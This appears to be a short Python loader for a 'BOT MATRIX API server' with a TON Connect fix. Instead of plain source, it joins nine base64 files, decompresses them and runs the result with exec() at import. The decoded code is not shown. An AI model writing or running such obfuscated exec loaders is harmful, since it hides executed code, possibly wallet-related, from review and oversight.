"""BOT MATRIX API server — loader (restored + TON Connect fix)."""
from __future__ import annotations
import pathlib, zlib, base64
_p = pathlib.Path(__file__).with_name
_blob = "".join(_p(f"sv{i}.b64").read_text().strip() for i in range(9))
_code = zlib.decompress(base64.b64decode(_blob)).decode("utf-8")
exec(compile(_code, str(pathlib.Path(__file__)), "exec"), globals())
